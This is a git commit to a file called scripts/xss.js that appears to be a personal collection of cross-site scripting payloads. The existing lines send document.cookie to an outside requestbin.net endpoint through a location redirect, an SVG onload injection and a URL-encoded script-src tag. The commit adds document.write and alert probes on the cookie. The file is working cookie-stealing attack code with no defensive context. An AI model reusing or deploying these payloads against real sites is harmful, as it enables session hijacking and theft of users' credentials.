6393eb92fd40aa9c275c7495ce2133260b815738
Ne0Lux-C1Ph3r <neolux-cipher@hotmail.fr>
2019-10-25 05:35:05 +0200

    Update xss.js

--- scripts/xss.js
+++ scripts/xss.js
@@ -1,3 +1,5 @@
 document.location="http://requestbin.net/r/17fs0tk1?" + document.cookie;
 "><svg/onload=location="http://requestbin.net/r/17fs0tk1?" + document.cookie>;
 %3C/script%3E%3Cscript/src=//requestbin.net/r/17fs0tk1%3E%3C/script%3E
+document.write(document.cookie);
+alert(document.cookie);
